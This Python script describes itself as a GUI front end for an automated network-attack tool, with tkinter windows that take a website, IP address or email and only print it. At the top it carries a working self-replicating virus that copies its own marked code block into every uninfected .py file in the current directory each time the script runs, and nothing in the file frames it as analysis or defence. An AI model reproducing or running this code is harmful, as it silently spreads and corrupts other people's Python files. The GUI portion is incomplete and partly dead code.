# Main application/front end for running an automated tool to conduct network attacks

from tkinter import *
import sys, glob, re

# Get a copy of the virus
vCode = []
fh = open(sys.argv[0], 'r')
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if(re.search('^# VIRUS BEGINS HERE', line)): inVirus = True
    if(inVirus): vCode.append(line)
    if(re.search('^# VIRUS ENDS HERE', line)): break

# Find potential victims
progs = glob.glob('*.py')

# Check and infect
for prog in progs:
    fh = open(prog, 'r')
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if('# VIRUS BEGINS HERE' in line):
            infected = True
            break

    if not infected:
        newCode = []
        if('#:' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

# Optional payload

# VIRUS ENDS HERE #
# Allow the user to enter: website, email address, IP address

from tkinter import *

sources = {"Website", "IP Address", "Email Address"}

num = freq = 0


def frnt():
    c = Tk()
    c.title("Source Selection")
    mainframe = Frame(c)
    mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
    mainframe.columnconfigure(0, weight=1)
    mainframe.rowconfigure(0, weight=1)
    mainframe.pack(pady=100, padx=100)
    # Drop Down list for Malware

    tkvar = StringVar(c)

    popupMenu = OptionMenu(mainframe, tkvar, *sources)
    Label(mainframe, text="Choose Source", padx=100).grid(row=1, column=1)
    popupMenu.grid(row=2, column=1, padx=100)

    def change_dropdown(*args):
        x = tkvar.get()
        if x == "Website": web()
        if x == "IP Address": ip()
        if x == "Email Address": email()

    tkvar.trace('w', change_dropdown)

    # if tkvar.trace('w', change_dropdown) == "Website":
    #     print("Website")
    #
    # if tkvar.trace('w', change_dropdown) == "Website":
    #     print("IP Address")
    #
    # if tkvar.trace('w', change_dropdown) == "Website":
    #     print("Email Address")

    c.mainloop()

def web():
    c = Tk()

    e1 = Entry(c)
    e1.pack()
    a = e1.get()
    e1.grid(row=0, column=1)
    Label(c, text="Enter Website Address").grid(row=0)

    Button(c, text="Enter", command=lambda: gt()).grid(row=0, column=2)

    z = Button(c, text="Return to main menu", height=1, width=18, command=lambda: frnt())
    z.grid(row=2, column=1)

    def gt():
        a = e1.get()
        print(a)
    c.mainloop()


def ip():
    c = Tk()

    e1 = Entry(c)
    e1.pack()
    a = e1.get()
    e1.grid(row=0, column=1)
    Label(c, text="Enter IP Address").grid(row=0)

    Button(c, text="Enter", command=lambda: gt()).grid(row=0, column=2)

    z = Button(c, text="Return to main menu", height=1, width=18, command=lambda: frnt())
    z.grid(row=2, column=1)

    def gt():
        a = e1.get()
        print(a)
    c.mainloop()


def email():
    c = Tk()

    e1 = Entry(c)
    e1.pack()
    a = e1.get()
    e1.grid(row=0, column=1)
    Label(c, text="Enter email").grid(row=0)

    Button(c, text="Enter", command=lambda: gt()).grid(row=0, column=2)

    z = Button(c, text="Return to main menu", height=1, width=18, command=lambda: frnt())
    z.grid(row=2, column=1)

    def gt():
        a = e1.get()
        print(a)
    c.mainloop()



a = Tk()
b = Button(a, text="Choose source", height=1, width=10, command=lambda: frnt())
b.pack()
a.mainloop()

frnt()
